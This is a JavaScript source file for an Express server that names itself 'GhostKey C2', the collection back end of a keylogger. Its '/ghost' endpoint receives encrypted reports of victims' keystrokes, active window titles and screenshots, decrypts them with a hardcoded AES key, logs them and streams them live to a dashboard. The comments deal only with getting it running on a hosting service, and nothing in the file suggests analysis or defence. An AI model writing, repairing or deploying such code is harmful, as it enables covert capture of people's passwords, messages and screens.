const express = require('express');
const CryptoJS = require('crypto-js');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const AES_KEY = "x93mK!qWeR7zL9p&2vN8bT5cY4fU6jH0";

app.use(cors());
app.use(bodyParser.json({ limit: '20mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// Explicit root route
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// SSE clients array (FIXED: use 'let' to allow mutation)
let clients = [];  // ← CHANGED FROM 'const'

// Recent logs for polling fallback
const recentLogs = [];

// SSE endpoint with Render-friendly headers
app.get('/events', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('X-Accel-Buffering', 'no');  // Prevents Render buffering
  res.setHeader('Access-Control-Expose-Headers', '*');
  res.flushHeaders();

  res.write(': connected\n\n');
  clients.push(res);

  // FIXED: Use function for closure-safe removal
  req.on('close', () => {
    clients = clients.filter(c => c !== res);  // ← SAFE FILTER, NO CONST ERROR
  });
});

// Polling endpoint for fallback
app.get('/logs', (req, res) => {
  res.json(recentLogs);
});

function broadcast(payload) {
  const message = JSON.stringify(payload);
  clients.forEach(client => {
    try {
      client.write(`data: ${message}\n\n`);
    } catch (e) {
      // Ignore dead clients
    }
  });
}

// FIXED Decrypt (handles IV + CBC perfectly)
function decrypt(b64) {
  try {
    const data = CryptoJS.enc.Base64.parse(b64);
    const iv = data.clone();
    iv.sigBytes = 16;
    iv.clamp();
    const ciphertext = data.clone();
    ciphertext.words.splice(0, 4);  // Remove IV (16 bytes = 4 words)
    ciphertext.sigBytes -= 16;

    const decrypted = CryptoJS.AES.decrypt(
      { ciphertext: ciphertext },
      CryptoJS.enc.Utf8.parse(AES_KEY),
      {
        iv: iv,
        mode: CryptoJS.mode.CBC,
        padding: CryptoJS.pad.Pkcs7
      }
    );
    return JSON.parse(decrypted.toString(CryptoJS.enc.Utf8));
  } catch (e) {
    console.log("Decrypt failed:", e.message);
    return null;
  }
}

// Main endpoint
app.post('/ghost', (req, res) => {
  const payload = decrypt(req.body.data);
  if (payload) {
    console.log(`[+] ${payload.Client} | ${payload.Window} | ${payload.Keys?.length || 0} keys${payload.Screenshot ? ' + screenshot' : ''}`);
    broadcast(payload);
    recentLogs.push(payload);  // For polling
    if (recentLogs.length > 100) recentLogs.shift();  // Keep last 100
  }
  res.json({ success: true });
});

// Legacy
app.post('/log', (req, res) => res.json({ success: true }));

// Heartbeat to keep SSE alive on Render
setInterval(() => {
  clients.forEach(client => {
    try {
      client.write(': heartbeat\n\n');
    } catch {}
  });
}, 15000);

// 404 fallback
app.use((req, res) => {
  res.status(404).send("GhostKey C2 — No route");
});

app.listen(PORT, () => {
  console.log(`GhostKey Dashboard LIVE → http://localhost:${PORT}`);
});